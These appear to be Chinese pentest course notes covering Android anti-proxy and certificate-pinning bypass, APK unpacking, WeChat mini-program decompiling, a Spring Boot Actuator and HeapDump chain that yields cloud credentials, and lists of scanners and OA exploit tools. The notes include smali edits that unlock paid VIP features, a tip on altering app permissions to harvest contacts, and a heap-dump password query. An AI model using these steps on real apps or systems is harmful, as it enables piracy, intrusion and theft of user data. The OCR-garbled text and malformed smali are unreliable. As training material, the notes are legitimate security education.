<h4 id="演示案例：-39"><a href="#演示案例：-39" class="headerlink" title="演示案例："></a>演示案例：</h4><p>某牛牛防抓包-xposed&amp;frida&amp;rOcapture<br>某社交防抓包-Proxifier&amp;frida&amp;rocapture</p>
<h4 id="反代理绕过："><a href="#反代理绕过：" class="headerlink" title="反代理绕过："></a>反代理绕过：</h4><p><a href="https://zone.huoxian.cn/d/440-app">https://zone.huoxian.cn/d/440-app</a><br>1、自身的抓包应用<br>2、Proxifier转发使用<br>思路：<br>1、先使用模拟器中的代理软件检测app是否有防代理机制，若存在则考虑在宿主机上采用proxifier转发模拟器的数据包到burp绕过反代理的检测机制<br>2、若通过上述手段后app仍显示网路错误，但是burp中显示一两个数据包，则是验证了证书，若想要绕过证书可采用以下三种方法，安装xposed框架–安装绕过代理、绕过证书应用–开启proxifier代理转发</p>
<h4 id="证书校验绕过："><a href="#证书校验绕过：" class="headerlink" title="证书校验绕过："></a>证书校验绕过：</h4><p>情况1，客户端不存在证书校验，服务器也不存在证书校验，<br>情况2，客户端存在校验服务端证书，服务器也不存在证书校验，单项校验。<br>情况3、客户端存在证书校验，服务器也存在证书校验，双向校验。<br>1、Frida&amp;rocapture底层<br>2、Xposed&amp;JustTrust&amp;HOOK<br>3、反编译逆向提取证书重编打包</p>
<p>探探APP测试：1、先尝试模拟器代理转发数据到burp（显示网络连接异常）<br>2、尝试使用proxifier代理转发模拟器的数据包到burp（有数据包但是因为转发速度限制仍存在问题）<br>3、使用xposed尝试绕过反代理和证书</p>
<p>夜神模拟器和逍遥模拟器<br>有些应用存在反虚拟机功能，检测到为虚拟机时会打不开应用，夜神模拟器可以绕过反vm检测</p>
<h1 id="第69天-APP攻防-反编译-查壳脱壳-重打包签名-修改次数会员版权限制"><a href="#第69天-APP攻防-反编译-查壳脱壳-重打包签名-修改次数会员版权限制" class="headerlink" title="第69天 APP攻防-反编译&amp;查壳脱壳&amp;重打包签名&amp;修改次数会员版权限制"></a>第69天 APP攻防-反编译&amp;查壳脱壳&amp;重打包签名&amp;修改次数会员版权限制</h1><h4 id="知识点：-46"><a href="#知识点：-46" class="headerlink" title="知识点："></a>知识点：</h4><p>1、APP防代理绕过-应用&amp;转发<br>2、APP证书校验类型-单向&amp;双向<br>3、APP证书校验绕过-Frida&amp;XP框架等</p>
<h4 id="章节点：-2"><a href="#章节点：-2" class="headerlink" title="章节点："></a>章节点：</h4><p>1、信息收集-应用&amp;资产提取&amp;权限等<br>2、漏洞发现-反编译&amp;脱壳&amp;代码审计<br>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p>
<h4 id="核心点：-2"><a href="#核心点：-2" class="headerlink" title="核心点："></a>核心点：</h4><p>0、内在点-资产提取&amp;版本&amp;信息等<br>1、抓包点-反代理&amp;反证书&amp;协议等<br>2、逆向点-反编译&amp;脱壳&amp;重打包等<br>3、安全点-资产&amp;接口&amp;漏洞&amp;审计等</p>
<h4 id="演示案例：-40"><a href="#演示案例：-40" class="headerlink" title="演示案例："></a>演示案例：</h4><p>反编译加固-自动查壳脱壳<br>功能修改-反编译&amp;次数&amp;会员<br>功能修改-反编译&amp;图标&amp;信息<br>打包编译证书签名&amp;重打包等</p>
<p>反编译加固-自动查壳脱壳<br><a href="https://github.com/CodingGay/BlackDex">https://github.com/CodingGay/BlackDex</a><br>查壳：ApkScan-PWD<br>脱壳：BlackDex</p>
<h4 id="功能修改-反编译-次数-会员"><a href="#功能修改-反编译-次数-会员" class="headerlink" title="#功能修改-反编译&amp;次数&amp;会员"></a>#功能修改-反编译&amp;次数&amp;会员</h4><p>贵妃APP实战：<br>思路：功能每日观看次数处尝试修改手机型号、IEMI值可绕过次数限制<br>修改get_is_svip为1，使得用户默认为svip<br>-次数：<br>逻辑：修改手机型号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.method public getRe_today_view_times(Ljava/lang/String;</span><br><span class="line">	.locals 1</span><br><span class="line">	.line 307</span><br><span class="line">	iget-object vo,po,Lcom/ufozfnxzqm/dvbphwfo/entity/Userlnfo;-</span><br><span class="line">re_today_view_times:Ljava/lang/String;</span><br></pre></td></tr></table></figure>

<p>会员：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.method public getls_vip（）I</span><br><span class="line">	.locals 1</span><br><span class="line">	.line 347</span><br><span class="line">	.iget vo,p0,Lcom/ufozfnxzqm/dvbphwfo/entity/Userlnfo;-&gt;is vip:I</span><br><span class="line">	const/4 vo.0x</span><br><span class="line">	return vo</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>

<h4 id="功能修改-反编译-图标-信息"><a href="#功能修改-反编译-图标-信息" class="headerlink" title="功能修改-反编译&amp;图标&amp;信息"></a>功能修改-反编译&amp;图标&amp;信息</h4><p>使用安卓修改大师修改图标和信息，还可以修改app权限获取收集通讯录等</p>
<h1 id="第70天-APP攻防-微信小程序-解包反编译-数据抓包-APK信息资源提取"><a href="#第70天-APP攻防-微信小程序-解包反编译-数据抓包-APK信息资源提取" class="headerlink" title="第70天 APP攻防-微信小程序&amp;解包反编译&amp;数据抓包&amp;APK信息资源提取"></a>第70天 APP攻防-微信小程序&amp;解包反编译&amp;数据抓包&amp;APK信息资源提取</h1><h4 id="知识点：-47"><a href="#知识点：-47" class="headerlink" title="知识点："></a>知识点：</h4><p>1、APK信息资源提取<br>2、微信小程序致据抓包<br>3、做信小程序解包反编译</p>
<p>1、信息收集应用8资产提取&amp;权限等<br>2、漏润发现-反编泽&amp;脱壳&amp;代码审计<br>3、安全评估组件8散密匙&amp;思意分析</p>
<h4 id="核心点：-3"><a href="#核心点：-3" class="headerlink" title="核心点："></a>核心点：</h4><p>1、内在点资产提取&amp;版本&amp;信息等<br>2、抓包点-反代理8反证书8协议等<br>3、逆向点-反编译8脱壳8重打包等<br>4、安全点资产&amp;接口&amp;漏洞&amp;审计等</p>
<h3 id="演示案例：-41"><a href="#演示案例：-41" class="headerlink" title="演示案例："></a>演示案例：</h3><p>APP&amp;APK-信息资源文件提取<br>微信小程序-真机&amp;模拟器数据抓包<br>微信小程序-PC&amp;模拟器分包反编译</p>
<h4 id="APP-APK-信息资源文件提取"><a href="#APP-APK-信息资源文件提取" class="headerlink" title="APP&amp;APK-信息资源文件提取"></a>APP&amp;APK-信息资源文件提取</h4><p>APK Messenger–是本信愿&amp;资源文件&amp;开启权限等</p>
<h4 id="微信小程序真机-模拟器数据抓包"><a href="#微信小程序真机-模拟器数据抓包" class="headerlink" title="微信小程序真机&amp;模拟器数据抓包"></a>微信小程序真机&amp;模拟器数据抓包</h4><p>安卓系统抓包（微信小程序）：<br>1、安卓系统7.0以下版本，不管微信任意版本，都会信任系统提供的证书<br>2、安卓系统7.0以上版本，微信7.0以下版本，微信会信任系统提供的证书<br>3、安卓系统7.0以上版本，微信7.0以上版本，微信只信任它自己配置的证书列表<br>基于上述我们解决的方式如下：<br>1、将证书安装到系统证书中(需要r00t)<br>2、苹果手机（苹果手机不受此影响）<br>3、采用安卓系统低于7.0的横拟器<br>演示：逍遥模拟器5.1安卓系统微信小程序抓包<br>思路：模拟器代理转发到burp<br>演示：夜神模拟器多开5安卓系统微信小程序抓包<br>演示：真机IPhone-OS系统微信小程序抓包<br>条件：抓包本机需要和Iphone手机处于同一WIFI下<br>Iphonei配置wif的代理，代理设置地址写本地抓包的工具地址和端口</p>
<p>安全点：<br>渗透角度：测试的app提供服务的服务器，网站，接口等，一旦这个有安全问题，被不法<br>分子利用，相当于APP正常服务就会受到直接的影响！<br>APK-白盒-Java代码审计<br>APK-黑盒-资产&amp;WEB&amp;IP&amp;接口等<br>小程序-白盒-Node.JS代码审计<br>小程序黑盒资产&amp;WEB&amp;P&amp;接口等<br>开发角度：测试的app里代码的设计安全，采用没加密的发送数据，采用权限过高的设置<br>导致攻击者利用app获取到手机的敏感信息等。<br>弱加密，逻辑安全，授权，中间人等</p>
<h4 id="微信小程序-PC-模拟器分包反编译"><a href="#微信小程序-PC-模拟器分包反编译" class="headerlink" title="微信小程序-PC&amp;模拟器分包反编译"></a>微信小程序-PC&amp;模拟器分包反编译</h4><p>1、高富帅版：<br>欢迎使用多功能小程序助手工具，点击确定开始使用。<br>免责声明：不得将小程序反编泽源码程序和反编泽图片素材挪作商业或盈利用<br>使用教程地：https:<a href="http://www.kancloud.cn/ludeqi/XCXZS/2607637">www.kancloud.cn/ludeqi/XCXZS/2607637</a><br>最新版下载地址：https:xcX.siqingw.top&#x2F;xcx.zip<br>2、穷屌丝版：<br><a href="https://github.com/sanriqing/WxAppUnpacker">https://github.com/sanriqing/WxAppUnpacker</a><br>安装node.js<br><a href="http://nodejs.cn/download/">http://nodejs.cn/download/</a><br>安装依赖：<br>npm install<br>模拟器取出wxapkg文件：<br>&#x2F;data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicroMsg&#x2F;xxxxxx&#x2F;appbrand&#x2F;pkg<br>反编译解包<br>node wuWxapkg.js -s&#x3D;…&#x2F;xxxx.wxapkg</p>
<h1 id="第71天-APP攻防-实战拿下-Springboot未授权-HeapDump提取-OSS利用"><a href="#第71天-APP攻防-实战拿下-Springboot未授权-HeapDump提取-OSS利用" class="headerlink" title="第71天 APP攻防-实战拿下&amp;Springboot未授权&amp;HeapDump提取&amp;OSS利用"></a>第71天 APP攻防-实战拿下&amp;Springboot未授权&amp;HeapDump提取&amp;OSS利用</h1><h4 id="安全测试报告："><a href="#安全测试报告：" class="headerlink" title="安全测试报告："></a>安全测试报告：</h4><p>1、Spring Boot Actuator v.2未授权访问<br>2、Spring Boot RCE<br>3、HeapDump-信息泄漏-帐号密码等<br>select s from java.lang.String s<br>where &#x2F;pass&#x2F;.test(s.value.toString（）)</p>
<p>-HeapDump:分析：            ———-忽然想起来之前遇到渗透靶场里面也考了这个知识点，就是在泄露的信息中找的到flag。<br>JVisualVM MAT heapdump_tool等<br>JVisualVM:jdk自带<br>MAT:<a href="https://www.eclipse.org/mat/downloads.php">https://www.eclipse.org/mat/downloads.php</a><br>heapdump_tool:<a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a><br>-Actuator未授权检测：<br><a href="https://github.com/rabbitmask/SB-Actuator">https://github.com/rabbitmask/SB-Actuator</a><br>-SpringBooti漏洞利用：<br><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a><br>-OSS_AccessKey利用：<br><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a></p>
<h4 id="录像剪辑严重这里只简单说一下思路："><a href="#录像剪辑严重这里只简单说一下思路：" class="headerlink" title="录像剪辑严重这里只简单说一下思路："></a>录像剪辑严重这里只简单说一下思路：</h4><p>APP抓包信息收集出域名发现使用webpack所以packfuzz进行扫描，<br>再把域名放到awvs进行扫描<br>–发现actuator未授权访问漏洞（进行rce测试）<br>–下载heapdump下载后分析–翻出阿里云mysql账号密码<br>–因为只能本地访问所以连接失败–继续翻heapdump文件使用heapdump_tools翻出阿里云主机key<br>–获取到阿里云主机权限</p>
<h1 id="第72天-漏洞发现-Web框架中间件-联动-Goby-Afrog-Xray-Awvs-Vulmap"><a href="#第72天-漏洞发现-Web框架中间件-联动-Goby-Afrog-Xray-Awvs-Vulmap" class="headerlink" title="第72天 漏洞发现-Web框架中间件&amp;联动&amp;Goby&amp;Afrog&amp;Xray&amp;Awvs&amp;Vulmap"></a>第72天 漏洞发现-Web框架中间件&amp;联动&amp;Goby&amp;Afrog&amp;Xray&amp;Awvs&amp;Vulmap</h1><h4 id="知识点：-48"><a href="#知识点：-48" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Bup简单介绍&amp;使用说明<br>2、Xray简单介绍&amp;使用说明<br>3、AWWS简单介绍&amp;使用说明<br>4、Goby简单介绍&amp;使用说明<br>5、Afrog简单介绍&amp;使用说明<br>6、ulmap简单介绍&amp;使用说明<br>7、Pocassist简单介绍&amp;使用说明<br>8、掌握工具安装使用&amp;原理&amp;联动&amp;适用<br>市面上有很多漏扫系统工具脚本，课程讲到的基本都是目前主流推荐的优秀项目！<br>具体项目：Burpsuite,Awvs,Xray,Goby,Afrog,Vulmap,Pocassist,Nessus,<br>Nuclei,Pentestkit,Kunyu,BP播件(HaE,ShiroScan.FastJsonScan,Log4j2Scan等)等。</p>
<h4 id="章节点：-3"><a href="#章节点：-3" class="headerlink" title="章节点："></a>章节点：</h4><p>1、漏洞发现-Web&amp;框架层面<br>2、漏洞发现-服务&amp;中间件层面<br>2、漏洞发现-APP&amp;小程序层面<br>3、漏洞发现-PC操作系统层面</p>
<p>Acunetix-一款商业的Web漏洞扫描程序，它可以检查Web应用程序中的漏洞，如SQL注 入、跨站脚本攻击、身份验证页上的弱口令长度等。它拥有一个操作方便的图形用户界 面，并且能够创建专业级的Wb站点安全审核报告。新版本集成了漏洞管理功能来扩展企 业全面管理、优先级和控制漏洞威胁的能力。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、网站源码采用自己开发搭建</span><br><span class="line">2、网站源码采用开源CMS搭建</span><br><span class="line"></span><br><span class="line">常规漏洞 -自己开发搭建</span><br><span class="line">常规漏洞 - 开源CMS 团队可以做这个事情 一般用工具直接找到漏洞不太现实(其他非源码漏除外)</span><br><span class="line"></span><br><span class="line">冷门 小众 国内的CMS源码 用 AWVS不适合</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Burp Suite,是用于攻击web应用程序的集成平台，包含了许多工具。Burp Suite为这些工具</span><br><span class="line">设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应</span><br><span class="line">的HTTP消息、持久性、认证、代理、日志、警报。</span><br><span class="line"></span><br><span class="line">用到最多的工具感觉是，Web手必备</span><br></pre></td></tr></table></figure>

<blockquote>
<p>pocassist是一个Golang编写的全新开源漏洞测i试框架。实现对poc的在线编辑、管理、测<br>试。如果你不想撸代码，又想实现即0c的逻辑，又想在线对靶机快速测试，那就使用<br>pocassist吧。完全兼容xray,但又不仅仅是xTay。除了支持定义目录级漏洞poc,还支持服<br>务器级漏洞、参数级漏洞、U级漏洞以及对页面内容检测，如果以上还不满足你的需求，<br>还支持加载自定义脚本。</p>
</blockquote>
<blockquote>
<p>afrog是一款性能卓越。快速稳定、PoC可定制的漏洞扫猫（挖洞）工具，PoC涉及<br>CVE、CNVD、默认口令、信息泄露、指纹识别、未授权访问、任意文件读取、命令执行<br>等多种漏洞类型，帮助网络安全从业者快速验证并及时修复漏洞。</p>
</blockquote>
<blockquote>
<p>Xray是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神醒，支持主动、披动多种扫描方<br>式，自备言打平台、可以灵活定义POC,功能丰富，调用简单，支持Windows &#x2F;macOs<br>几inuX多种操作系统，可以满足广大安全从业者的自动化Wb漏洞深测需求。</p>
</blockquote>
<blockquote>
<p>Goby是一款新的网络安全测试工具，由赵武Zwell(Pangolin、JSky、FOFA作者)打造，<br>它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并<br>快速的从一个验证入口点，切换到横向。能通过智能自动化方式，帮助安全入门者就悉靶<br>场攻防，帮助攻防服务者、渗透人员更快的拿下目标</p>
</blockquote>
<blockquote>
<p>Vulmap是一款web漏洞扫描和验证工具，可对webapps进行漏洞扫描，并且具备漏洞利用<br>功能，目前支s持的webapps包括activemq,flink,shiro,sol,struts2,tomcat,unomi,drupal,<br>elasticsearch,fastison,jenkins,nexus,weblogic,jboss,spring,thinkphp</p>
</blockquote>
<p>真就差不多是，工具使用大战！</p>
<h3 id="演示案例：-42"><a href="#演示案例：-42" class="headerlink" title="演示案例："></a>演示案例：</h3><p>某APP-Web扫描-常规&amp;联动-Burp&amp;Awvs&amp;Xray<br>Vulfocus-框架扫描-特定-Goby&amp;Vulmap&amp;Afrog&amp;Pocassist<br>某资产特征-联动扫描-综合&amp;调用-Goby&amp;Awvs&amp;Xray&amp;Vulmap</p>
<h4 id="项目资源："><a href="#项目资源：" class="headerlink" title="项目资源："></a>项目资源：</h4><p><a href="https://www.ddosi.org/awvs14-6-log4j-rce/">https://www.ddosi.org/awvs14-6-log4j-rce/</a><br><a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a><br><a href="https://github.com/zan8in/afrog/releases">https://github.com/zan8in/afrog/releases</a><br><a href="https://github.com/zhzyker/vulmap/releases">https://github.com/zhzyker/vulmap/releases</a><br><a href="https://github.com/jweny/pocassist/releases">https://github.com/jweny/pocassist/releases</a><br><a href="https://github.com/gobysec/Goby/releases">https://github.com/gobysec/Goby/releases</a></p>
<h4 id="其他特扫："><a href="#其他特扫：" class="headerlink" title="其他特扫："></a>其他特扫：</h4><p>1、GUI TOOLS V6.1by安全圈小王子-bugfixed<br>2、CMS漏洞扫描器名称支持的CMS平台<br>Droopescan<br>WordPress,Joomla,Drupal,Moodle,SilverStripe<br>CMSmap WordPress,Joomla,Drupal,Moodle<br>CMSeeK WordPress,Joomla,Drupal<br>WPXF WordPress<br>WPScan WordPress<br>WPSeku WordPress<br>WPForce WordPress<br>JoomScan Joomla<br>JoomlaVS Joomla<br>JScanner Joomla<br>Drupwn Drupal<br>Typo3Scan Typo3<br>致远OA综合利用工具<br><a href="https://github.com/Summer177/seeyon_exp">https://github.com/Summer177/seeyon_exp</a><br>seeyon exp<br>通达OA综合利用工具<br><a href="https://github.com/xinyu2428/TDOA">https://github.com/xinyu2428/TDOA</a> RCE TDOA RCE<br>蓝凌OA漏洞利用工具前台无条件RCE文件写入<br><a href="https://github.com/yuanhaiGreg/LandrayExploit">https://github.com/yuanhaiGreg/LandrayExploit</a> LandrayExploit<br>泛微OA漏洞综合利用脚本htps:&#x2F;&#x2F;github.com&#x2F;z1 un&#x2F;weaver_exp weaver_.eXp<br>锐捷网络EG易风关RCE批量安全检测<br><a href="https://github.com/Tas9er/EgGateWayGetShell">https://github.com/Tas9er/EgGateWayGetShell</a><br>EgGateWayGetShell<br>CMSmap针对流行cMS进行安全扫描的工具htps:&#x2F;&#x2F;github.com&#x2F;Dionach&#x2F;CMSmap<br>CMSmap<br>使用Go开发的WordPress漏洞扫描工具<br><a href="https://github.com/blackbinn/wprecon">https://github.com/blackbinn/wprecon</a><br>wprecon<br>一个Ruby框架，旨在帮助对VordPress系统进行渗透测试<br><a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a> wordpress-exploit-framework<br>WPScan WordPress安全扫描器<br><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a> wpscan<br>VPForce Wordpress攻击套件<a href="https://github.com/nO0">https://github.com/nO0</a> py&#x2F;WPForce<br>WPForce</p>
<p>某APP-Web扫描-常规&amp;联动-Burp&amp;Awvs&amp;Xray<br>案例：配合联动对某APP进行安全检查评估<br>对比工具优缺点<br>-对比工具使用方法</p>
<p>Awvs:</p>
<p>任务添加&amp;数据头部&amp;代理模式&amp;扫描模式等<br>example:<a href="http://demo.aisec.cn/">http://demo.aisec.cn/</a></p>
<p>Xray:</p>
<p>主动扫描&amp;被动扫描&amp;POC资源等<br>.\xray_windows_amd64.exe webscan –basic-craller <a href="http://xx/%E2%80%93html-output">http://xx/–html-output</a> tomcat.html<br>.\xray_windows_amd64.exe webscan–listen 127.0.0.1:7777–html-output app.html<br>主动扫描的缺点:</p>
<p>URL单点扫描&amp;数据包扫描<br>1、相互联动性解决漏扫<br>2、相互联动性解决URL未探针<br>手工触发URL数据包&amp;扫描器爬虫规则探针<br>Burp&amp;Xray联动<br>1、Burp设置转发代理<br>2、Xray设置被动扫描<br>AwWs&amp;Xray联动<br>1、AWWS设置代理扫猫<br>2、Xray设置被动扫描<br>Awvs&amp;Burp&amp;Xray联动<br>1、AwWS设置代理扫描<br>2、Bup设置转发代理<br>3、Xray设置被动扫描</p>
<p>Vulfocus-框架扫描-特定&amp;核心-Goby&amp;Vulmap&amp;Afrog&amp;Pocassist<br>案例：配合vulfocus进行某服务或中间件的安全检查评估</p>
<p>某资产特征-联动扫描-综合&amp;调用-Goby&amp;AWVS&amp;Xray&amp;Vulmap<br>案例：配合Goby&amp;Fofa插件进行某中间件的安全检查评估<br>1、下载拓展插件<br>2、设置配置插件</p>
<p>这几节课主要讲工具的使用简单看一下 主要是实践</p>
<h1 id="第73天-漏洞发现-操作系统服务中间件-Nuclei-Nessus-Nexpose-Goby"><a href="#第73天-漏洞发现-操作系统服务中间件-Nuclei-Nessus-Nexpose-Goby" class="headerlink" title="第73天 漏洞发现-操作系统服务中间件&amp;Nuclei&amp;Nessus.&amp;Nexpose&amp;Goby"></a>第73天 漏洞发现-操作系统服务中间件&amp;Nuclei&amp;Nessus.&amp;Nexpose&amp;Goby</h1><h4 id="知识点：-49"><a href="#知识点：-49" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Goby简单介绍&amp;使用说明<br>2.Nuclei简单介绍&amp;使用说明<br>3、Nessus简单介绍&amp;使用说明<br>4、Nexpose简单介绍&amp;使用说明<br>5、掌握工具安装使用&amp;原理&amp;联动&amp;适用<br>市面上有很多漏扫系统工具脚本，课程讲到的基本都是目前主流推荐的优秀项目！<br>具体项目：Burpsuite,AwWs,Xray,Goby,Afrog,Vulmap,Pocassist,Nessus,<br>Nuclei,Pentestkit,Nexpose,BP(HaE,ShiroScan.FastJsonScan,Log4j2Scan).</p>
<h4 id="章节点：-4"><a href="#章节点：-4" class="headerlink" title="章节点："></a>章节点：</h4><p>1、漏洞发现-Web&amp;框架层面<br>2、漏洞发现-服务&amp;中间件层面<br>2、漏洞发现-APP&amp;小程序层面<br>3、漏洞发现-PC操作系统层面</p>
<h4 id="演示案例：-43"><a href="#演示案例：-43" class="headerlink" title="演示案例："></a>演示案例：</h4><p>Nessus&amp;Nexposei漏扫操作系统漏洞<br>Goby&amp;Nuclei漏扫系统&amp;服务&amp;中间件漏洞<br>Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞<br>FofaMAP&amp;Nuclei漏扫自动化特定项目漏洞</p>
<h4 id="项目资源：-1"><a href="#项目资源：-1" class="headerlink" title="项目资源："></a>项目资源：</h4><p>Goby:<a href="https://github.com/gobysec/Goby/releases">https://github.com/gobysec/Goby/releases</a><br>Nuclei:<a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a><br>Nessus:<a href="https://mp.weixin.qq.com/s/G-7Yu8sefH3Bm3GRtUo2EA">https://mp.weixin.qq.com/s/G-7Yu8sefH3Bm3GRtUo2EA</a><br>Nexpose:<a href="https://www.fujieace.com/hacker/rapid7-nexpose.html">https://www.fujieace.com/hacker/rapid7-nexpose.html</a><br>FofaMAP:<a href="https://github.com/asaotomo/FofaMap">https://github.com/asaotomo/FofaMap</a></p>
<h4 id="案例1-Nessus-Nexpose漏扫操作系统漏洞"><a href="#案例1-Nessus-Nexpose漏扫操作系统漏洞" class="headerlink" title="案例1-Nessus&amp;Nexpose漏扫操作系统漏洞"></a>案例1-Nessus&amp;Nexpose漏扫操作系统漏洞</h4><p>安装使用</p>
<h4 id="案例2-Goby-Nucle漏扫系统-服务-中间件漏洞"><a href="#案例2-Goby-Nucle漏扫系统-服务-中间件漏洞" class="headerlink" title="案例2-Goby&amp;Nucle漏扫系统&amp;服务&amp;中间件漏洞"></a>案例2-Goby&amp;Nucle漏扫系统&amp;服务&amp;中间件漏洞</h4><p>goby图形化界面<br>nuclei 可以自定义检测脚本<br>Nuclei -u <a href="http://xxxxxxxx/">http://xxxxxxxx</a></p>
<h4 id="案例3-Nuclei漏扫特定资产-模版导入-最新漏洞"><a href="#案例3-Nuclei漏扫特定资产-模版导入-最新漏洞" class="headerlink" title="案例3-Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞"></a>案例3-Nuclei漏扫特定资产&amp;模版导入&amp;最新漏洞</h4><p>例子：CVE-2022-30525:ZyXl防火墙远程命令注入漏洞<br>FofaViewer:title&#x3D;&#x3D;“USG FLEX 50(USG20-VPN)”<br>nuclei.exe -t Zyxel.yaml -I z.txt<br>Zyxel.yaml<br>id:CVE-2022-30525</p>
<h4 id="案例4-FofaMAP户-Nucle漏扫自动化特定资产漏洞"><a href="#案例4-FofaMAP户-Nucle漏扫自动化特定资产漏洞" class="headerlink" title="案例4-FofaMAP户&amp;Nucle漏扫自动化特定资产漏洞"></a>案例4-FofaMAP户&amp;Nucle漏扫自动化特定资产漏洞</h4><h1 id="第74天-漏洞发现-Web框架中间件插件-BurpSuite-浏览器-被动-主动探针"><a href="#第74天-漏洞发现-Web框架中间件插件-BurpSuite-浏览器-被动-主动探针" class="headerlink" title="第74天 漏洞发现-Web框架中间件插件&amp;BurpSuite&amp;浏览器&amp;被动&amp;主动探针"></a>第74天 漏洞发现-Web框架中间件插件&amp;BurpSuite&amp;浏览器&amp;被动&amp;主动探针</h1><p>最近几天都是演示工具如何使用如：<a href="https://so.csdn.net/so/search?q=AWVS&spm=1001.2101.3001.7020">AWVS</a>、Nessus、nexpose等综合性利用工具。<br>Burp插件和漏扫工具的区别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标：</span><br><span class="line">1、用其他的工具项目去检测漏洞</span><br><span class="line"></span><br><span class="line">2、用Burpsuite抓包后带入插件检测</span><br><span class="line">有部分目标需要特定的数据包访问的</span><br><span class="line"></span><br><span class="line">1、登录状态和未登录状态</span><br><span class="line">2、不同目标访问的数据包的不同</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-50"><a href="#知识点：-50" class="headerlink" title="知识点："></a>知识点：</h4><p>1、浏览器插件&amp;BurpSuite插件<br>2、Hack-Tools&amp;pentestkit&amp;fofa view等<br>3、Fiora&amp;Spring&amp;Fastison&amp;Shiro&amp;Log4等<br>市面上有很多漏扫系统工具蜘本，课程讲到的基本都是目前主流推荐的优秀项目！<br>具体项目：Burpsuite,Awvs,Xray,Goby,Afrog,Vulmap,Pocassist,Nessus,<br>Nuclei,Pentestkit,Nexpose,BP(HaE,ShiroScan.FastJsonScan,Log4j2Scan).</p>
<h4 id="章节点：-5"><a href="#章节点：-5" class="headerlink" title="章节点："></a>章节点：</h4><p>1、漏洞发现-Web&amp;框架层面<br>2、漏洞发现服务&amp;中间件层面<br>3、漏洞发现-APP&amp;小程序层面<br>4、漏洞发现PC操作系统层面</p>
<h4 id="演示案例：-44"><a href="#演示案例：-44" class="headerlink" title="演示案例："></a>演示案例：</h4><p>浏览器插件-辅助&amp;资产&amp;漏洞库-Hack-Tools&amp;Fofa view&amp;Pentestkit<br>BurpSuite插件-被动&amp;特定扫描-Fiora&amp;Spring&amp;Fastison&amp;Shiro&amp;Log4j</p>
<p>浏览器插件-辅助&amp;资产&amp;漏洞库-Hack.Tools&amp;Fofa view&amp;Pentestkit<br>资产：<a href="https://github.com/fofapro/fofa_view">https://github.com/fofapro/fofa_view</a><br>信息收集 需要fofa为登录状态</p>
<p>辅助：<a href="https://github.com/LasCc/Hack-Tools">https://github.com/LasCc/Hack-Tools</a><br>工具箱包含有 反弹shell、系统命令、文件包含语句等</p>
<p>漏洞库：<a href="https://github.com/DenisPodgurskii/pentestkit">https://github.com/DenisPodgurskii/pentestkit</a><br>信息收集、漏洞探测、waf识别</p>
<p>BurpSuite插件-被动&amp;特定扫描-Fiora&amp;Spring&amp;Fastjson&amp;Shiro&amp;Log4</p>
<p><a href="https://github.com/bit4woo/Fiora">https://github.com/bit4woo/Fiora</a><br>功能：联动nuclei进行单个或多个poc测试</p>
<p><a href="https://github.com/metaStor/SpringScan">https://github.com/metaStor/SpringScan</a><br>SpringScan 漏洞检测 Burp插件<br><a href="https://github.com/Maskhe/FastjsonScan">https://github.com/Maskhe/FastjsonScan</a></p>
<p><a href="https://github.com/bigsizeme/Log4j-check">https://github.com/bigsizeme/Log4j-check</a><br>被动lg4j扫描 支持RC1绕过 log4J burp被扫插件、CVE-2021-44228、支持RC1绕过、支持json数据类型、支持dnslog.cn和burp内置DNS、可配合JNDIExploit生成payload</p>
<p><a href="https://github.com/projectdiscovery/nuclei-burp-plugin">https://github.com/projectdiscovery/nuclei-burp-plugin</a></p>
<p>这节主要讲的大部分都是对相关工具的使用。</p>
<h1 id="第75天-漏洞利用-MSF框架-CVE-CNVD-POC-EXP监控-查找-整理"><a href="#第75天-漏洞利用-MSF框架-CVE-CNVD-POC-EXP监控-查找-整理" class="headerlink" title="第75天 漏洞利用-MSF框架&amp;CVE&amp;CNVD&amp;POC&amp;EXP监控&amp;查找&amp;整理"></a>第75天 漏洞利用-MSF框架&amp;CVE&amp;CNVD&amp;POC&amp;EXP监控&amp;查找&amp;整理</h1><h4 id="知识点：-51"><a href="#知识点：-51" class="headerlink" title="知识点："></a>知识点：</h4><p>1、MSF-漏洞利用框架使用<br>2、库查找CVE&amp;CNVD&amp;关键字<br>3、库整理-CVE&amp;CNVD漏洞详情<br>4、新漏洞-框架或其他未集成利用<br>集成和未集成漏洞的利用思路，漏洞利用条件等。</p>
<p>漏洞发现后，一般会有那些关于漏洞的常见说明信息：<br>1、漏洞对象<br>2、漏洞编号<br>3、漏洞类型</p>
<h4 id="漏洞资源："><a href="#漏洞资源：" class="headerlink" title="漏洞资源："></a>漏洞资源：</h4><p>today-cve<br><a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html">https://cassandra.cerias.purdue.edu/CVE_changes/today.html</a><br>cve官网<br><a href="https://cve.mitre.org/">https://cve.mitre.org/</a><br>国家信息安全漏洞共享平台<br><a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a><br>国家信息安全漏洞库<br><a href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn/</a></p>
